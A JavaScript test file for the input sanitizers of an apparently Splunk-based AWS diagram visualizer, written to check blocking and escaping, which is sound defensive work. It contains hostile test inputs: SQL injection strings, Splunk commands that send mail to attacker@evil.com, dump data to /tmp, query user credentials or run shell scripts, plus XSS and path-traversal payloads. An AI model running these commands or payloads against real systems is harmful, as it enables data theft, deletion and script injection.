import test from 'node:test';
import assert from 'node:assert/strict';
import { 
    sanitizeSplunkToken, 
    validateColumnSpl, 
    sanitizePlaneTitle,
    sanitizeFallbackUrl
} from '../src/components/AwsDfdVisualizer/constants.js';
import { exportToDrawio } from '../src/components/AwsDfdVisualizer/parsers/drawioExporter.js';
import { exportToSvg } from '../src/components/AwsDfdVisualizer/parsers/svgExporter.js';

test('sanitizeSplunkToken strictly allowlists alphanumeric and safe punctuation', () => {
    assert.equal(sanitizeSplunkToken('arn:aws:ec2:us-east-1:123/inst-1'), 'arn:aws:ec2:us-east-1:123/inst-1');
    assert.equal(sanitizeSplunkToken("user' OR '1'='1"), 'user_ OR _1___1');
    assert.equal(sanitizeSplunkToken('token; DROP TABLE users;'), 'token_ DROP TABLE users_');
    assert.equal(sanitizeSplunkToken('index=main | eval x=1'), 'index_main _ eval x_1');
    assert.equal(sanitizeSplunkToken('`macro_call`'), '_macro_call_');
    assert.equal(sanitizeSplunkToken(null), '');
    assert.equal(sanitizeSplunkToken(123), '');
});

test('validateColumnSpl blocks macro expansions, high-risk commands, and XSS', () => {
    // Safe queries are permitted
    assert.equal(validateColumnSpl('index=aws sourcetype=aws:config | table resourceId, status'), 'index=aws sourcetype=aws:config | table resourceId, status');
    
    // Backtick macro expansions blocked
    assert.equal(validateColumnSpl('index=aws `aws_macro`'), '');

    // High-risk commands blocked
    assert.equal(validateColumnSpl('index=main | delete'), '');
    assert.equal(validateColumnSpl('| sendemail to="attacker@evil.com"'), '');
    assert.equal(validateColumnSpl('| outputcsv /tmp/stolen.csv'), '');
    assert.equal(validateColumnSpl('| rest /services/authentication/users'), '');
    assert.equal(validateColumnSpl('| runshellscript evil.sh'), '');

    // Script injection blocked
    assert.equal(validateColumnSpl('<script>alert(1)</script>'), '');
    assert.equal(validateColumnSpl('javascript:alert(1)'), '');
});

test('sanitizePlaneTitle strips malicious scripts, HTML tags, and preserves clean titles', () => {
    assert.equal(sanitizePlaneTitle('Identity/Management Plane'), 'Identity/Management Plane');
    assert.equal(sanitizePlaneTitle('⚙️ Control Plane'), '⚙️ Control Plane');
    assert.equal(sanitizePlaneTitle('Data Plane'), 'Data Plane');
    
    // Script tag recursive stripping and allowlisting
    assert.equal(sanitizePlaneTitle('Identity <scr<script>ipt>alert(1)</script> Plane'), 'Identity alert1 Plane');
    assert.equal(sanitizePlaneTitle('<script>alert("xss")</script>Policy Plane'), 'alertxssPolicy Plane');

    // Angle bracket stripping
    assert.equal(sanitizePlaneTitle('Custom <Plane> Title'), 'Custom Plane Title');
});

test('sanitizeFallbackUrl blocks path traversal, remote origins, and dangerous schemes', () => {
    // Remote URLs blocked -> fallback to generic.svg
    assert.ok(sanitizeFallbackUrl('http://evil.com/icon.svg').endsWith('generic.svg'));
    assert.ok(sanitizeFallbackUrl('https://evil.com/icon.svg').endsWith('generic.svg'));
    assert.ok(sanitizeFallbackUrl('//evil.com/icon.svg').endsWith('generic.svg'));

    // Script schemes blocked
    assert.ok(sanitizeFallbackUrl('javascript:alert(1)').endsWith('generic.svg'));
    assert.ok(sanitizeFallbackUrl('data:image/svg+xml,...').endsWith('generic.svg'));

    // Path traversal blocked
    assert.ok(sanitizeFallbackUrl('../../../etc/passwd').endsWith('generic.svg'));
    assert.ok(sanitizeFallbackUrl('icons/..\\..\\secret.svg').endsWith('generic.svg'));
    assert.ok(sanitizeFallbackUrl('%2e%2e%2fsecret.svg').endsWith('generic.svg'));

    // Legitimate static paths permitted
    const validAppPath = '/en-US/static/app/AWS-DFD-Visualizer/icons/aws.svg';
    assert.equal(sanitizeFallbackUrl(validAppPath), validAppPath);
});

test('exportToDrawio blocks serialization if script elements are detected', () => {
    const maliciousNode = {
        id: 'node-xss',
        label: '<script>alert(1)</script>',
        type: 'AWS::EC2::Instance',
        x: 100,
        y: 100
    };

    // The exporter escapes XML properly. If a raw unescaped script tag somehow persisted, it blocks.
    const xml = exportToDrawio([maliciousNode], [], false);
    assert.ok(xml);
    assert.ok(!xml.includes('<script>'));
    assert.ok(xml.includes('&lt;script&gt;')); // Safely escaped
});

test('exportToSvg validates script blocking on DOM elements', () => {
    // If null element passed, returns null safely
    assert.equal(exportToSvg(null), null);
});
